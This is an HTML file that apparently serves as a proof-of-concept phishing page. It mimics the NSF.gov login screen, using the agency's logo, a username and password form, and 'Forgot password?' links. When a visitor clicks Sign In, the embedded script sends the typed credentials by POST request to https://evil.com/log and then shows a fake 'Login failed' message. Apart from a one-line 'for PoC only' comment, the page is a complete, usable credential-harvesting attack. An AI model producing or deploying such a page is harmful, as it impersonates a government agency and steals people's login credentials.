<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NSF.gov Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            width: 350px;
            text-align: center;
        }
        .login-container h1 {
            margin-bottom: 10px;
            color: #333;
            font-size: 24px;
        }
        .login-container h5 {
            margin-top: 0;
            margin-bottom: 20px;
            color: #666;
            font-size: 14px;
        }
        .login-container input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
        }
        .login-container button {
            width: 100%;
            padding: 12px;
            background-color: #0078d4;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
        }
        .login-container button:hover {
            background-color: #005bb5;
        }
        .logo {
            width: 150px; /* Increased logo size */
            margin-bottom: 20px;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
        .footer a {
            color: #0078d4;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- NSF Logo -->
        <img src="https://www.nsf.gov/images/nsf_logo.png" alt="NSF Logo" class="logo">
        
        <!-- Login Header -->
        <h1>Log In</h1>
        <h5>To continue to NSF.gov</h5>
        
        <!-- Username and Password Fields -->
        <input type="text" id="username" placeholder="Username" required>
        <input type="password" id="password" placeholder="Password" required>
        
        <!-- Sign In Button -->
        <button onclick="submitLogin()">Sign In</button>
        
        <!-- Footer Links -->
        <div class="footer">
            <a href="#">Forgot password?</a> | <a href="#">Create account</a>
        </div>
    </div>

    <script>
        function submitLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Simulate sending data to a malicious server (for PoC only)
            fetch('https://evil.com/log', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ username, password }),
            });

            alert('Login failed. Please try again.'); // Simulate a failed login
        }
    </script>
</body>
</html>
